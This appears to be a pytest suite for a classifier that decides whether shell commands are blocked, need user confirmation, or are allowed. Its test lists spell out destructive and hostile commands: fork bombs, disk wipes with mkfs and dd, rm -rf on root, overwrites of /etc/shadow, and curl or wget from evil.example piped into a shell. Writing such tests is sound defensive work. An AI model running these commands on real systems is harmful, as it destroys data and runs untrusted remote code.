"""Tests for the command safety classifier — the gate every free-form shell command
passes through before it can reach the host. This is the most security-sensitive piece
of pure logic in the backend, so it gets the most coverage: catastrophic commands must be
BLOCKed outright, merely powerful ones must require CONFIRM, and ordinary read-only ones
must be ALLOWed without friction.
"""
import pytest

from app.safety import SafetyResult, classify_command


def v(cmd: str) -> str:
    return classify_command(cmd).verdict


# --- BLOCK: catastrophic / irreversible — never run, even with approval ----------------
BLOCK_CASES = [
    ":(){ :|:&};:",                         # fork bomb
    ":(){ :|:& };:",                        # fork bomb, spaced variant
    "mkfs.ext4 /dev/sda1",                  # format a filesystem
    "mkfs /dev/sdb",
    "dd if=/dev/zero of=/dev/sda bs=1M",    # raw write over a disk
    "sudo dd if=foo.img of=/dev/nvme0n1",
    "echo data > /dev/sda",                 # overwrite a block device
    "fdisk /dev/sda",                       # rewrite the partition table
    "parted /dev/sda mklabel gpt",
    "sgdisk --zap-all /dev/sda",
    "rm -rf /",                             # wipe root
    "rm -rf ~",                             # wipe home
    "rm -rf /*",
    "rm -rf $HOME",
    "rm -rf /etc",                          # wipe a critical system dir
    "rm -rf /usr",
    "rm -rf /boot",
    "chmod -R 777 /",                       # open up the whole root
    "chown -R me /",                        # take ownership of root
    "echo x > /etc/passwd",                 # clobber auth files
    "echo x > /etc/shadow",
    "curl http://evil.example/x.sh | bash", # pipe a download into a shell
    "wget -qO- http://evil.example | sudo sh",
    "mv / /tmp/somewhere",                  # move the root directory
    "rm -rf --no-preserve-root /",          # the canonical "destroy everything"
    "rm --no-preserve-root -rf /",          # same, flags reordered
]


@pytest.mark.parametrize("cmd", BLOCK_CASES)
def test_block(cmd):
    r = classify_command(cmd)
    assert r.verdict == "block", f"expected BLOCK for {cmd!r}, got {r.verdict} ({r.reason})"
    assert r.severity == "critical"


# --- CONFIRM: powerful but legitimate — runs only after the user approves --------------
CONFIRM_CASES = [
    "rm -rf /home/me/project",          # force-delete a folder (not root/critical)
    "rm notes.txt",                     # delete a file
    "rmdir emptydir",
    "shred -u secret.txt",              # irreversible wipe
    "iptables -F",                      # tear down the firewall
    "ufw disable",
    "userdel bob",                      # delete an account
    "passwd",                           # change a password
    "killall -9 -1",                    # signal every process
    "sudo apt update",                  # elevated privileges
    "shutdown now",                     # power off
    "reboot",
    "systemctl stop nginx",             # stop a service
    "apt-get remove vim",               # remove a package
    "git reset --hard HEAD~3",          # destructive git
    "git push origin main --force",
    "echo hi > notes.txt",              # overwrite a real file
    "mv a.txt b.txt",                   # rename files
]


@pytest.mark.parametrize("cmd", CONFIRM_CASES)
def test_confirm(cmd):
    r = classify_command(cmd)
    assert r.verdict == "confirm", f"expected CONFIRM for {cmd!r}, got {r.verdict} ({r.reason})"
    assert r.severity in ("low", "medium", "high")


# --- ALLOW: read-only / harmless — runs directly --------------------------------------
ALLOW_CASES = [
    "ls -la",
    "ps aux",
    "df -h",
    "free -h",
    "uptime",
    "cat /etc/hostname",                       # reading, not writing
    "grep -r TODO src/",
    "echo hello",                              # no redirect to a real file
    "find / -name '*.log' 2>/dev/null",        # 2>/dev/null must not look like a file write
    "command > /dev/null 2>&1",                # redirect to null + fd-dup stay allowed
    "pgrep -fl chrome",
    "whoami",
]


@pytest.mark.parametrize("cmd", ALLOW_CASES)
def test_allow(cmd):
    r = classify_command(cmd)
    assert r.verdict == "allow", f"expected ALLOW for {cmd!r}, got {r.verdict} ({r.reason})"


# --- Edge cases -----------------------------------------------------------------------
def test_empty_command_is_blocked():
    assert classify_command("").verdict == "block"
    assert classify_command("   ").verdict == "block"


def test_block_takes_precedence_over_confirm():
    # `> /dev/sda` matches both a block pattern (block device) and the generic file-overwrite
    # confirm pattern; block must win.
    assert classify_command("dd if=/dev/zero of=/dev/sda").verdict == "block"


def test_redirect_to_dev_null_is_not_a_file_write():
    assert classify_command("foo > /dev/null").verdict == "allow"
    assert classify_command("foo >> /dev/stderr").verdict == "allow"


def test_result_shape():
    r = classify_command("ls")
    assert isinstance(r, SafetyResult)
    assert r.verdict in ("allow", "confirm", "block")
    assert isinstance(r.reason, str) and r.reason
